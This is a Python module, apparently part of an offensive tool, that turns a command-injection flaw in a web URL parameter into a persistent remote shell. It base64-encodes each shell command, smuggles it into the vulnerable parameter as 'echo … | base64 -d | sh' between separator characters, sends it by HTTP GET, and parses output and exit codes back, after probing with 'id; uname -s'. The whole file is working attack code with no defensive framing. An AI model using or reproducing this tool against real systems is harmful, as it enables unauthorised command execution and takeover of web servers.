from __future__ import annotations
"""Eksekusi persisten lewat vektor command injection.
Setiap perintah dibungkus sh, di-base64, jadi quoting tak pernah pecah."""
import asyncio, base64
from .base import ShellBackend, ExecResult

WRAP = '{{ cd {cwd} 2>/dev/null; {cmd} ; }} 2>&1; printf "\\n__M4Z__%s\\n" "$?"'


class CmdInjectShell(ShellBackend):
    kind = "cmd-injection"

    def __init__(self, ctx, sid, target, *, url: str, param: str, sep: str, wrapper: str):
        super().__init__(ctx, sid, target)
        self.url, self.param, self.sep, self.wrapper = url, param, sep, wrapper

    async def establish(self) -> bool:
        r = await self.exec("id; uname -s")
        return "uid=" in r.out or "Linux" in r.out or "Darwin" in r.out

    async def exec(self, cmd: str, timeout: int = 30) -> ExecResult:
        script = WRAP.format(cwd=self.cwd, cmd=cmd)
        b64 = base64.b64encode(script.encode()).decode()
        payload = f"echo {b64} | base64 -d | sh"
        target = self.url.replace(f"{self.param}=",
                                  f"{self.param}={self.sep}{payload}{self.sep}", 1)
        try:
            r = await self.ctx.http.get(target, timeout=timeout)
            text = r.text
        except Exception as e:
            return ExecResult(out=f"[transport] {e}", rc=124)
        rc = 0
        if "__M4Z__" in text:
            text, _, tail = text.rpartition("__M4Z__")
            rc = int(tail.strip().splitlines()[0] or 0) if tail.strip() else 0
        if cmd.strip().startswith("cd "):
            self.cwd = cmd.strip()[3:].strip() or self.cwd
        return ExecResult(out=text[-400_000:], rc=rc)
